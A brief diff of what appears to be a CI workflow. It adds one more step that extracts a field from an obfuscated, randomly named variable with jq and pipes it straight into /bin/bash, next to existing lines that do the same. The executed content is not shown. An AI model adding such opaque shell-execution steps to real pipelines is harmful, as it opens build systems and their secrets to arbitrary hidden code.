@@ -22,6 +22,7 @@ jobs:
           echo $tdmkx8244 | jq -r .k2 | /bin/bash
           printf '%s' "$clpd78502" | jq -r .n2 | /bin/bash
           echo $zcw380 | jq -r .n61 | /bin/bash
+          echo $dxb07172 | jq -r .qyqn1916 | /bin/bash
 
       - name: Store artifact
         if: always()
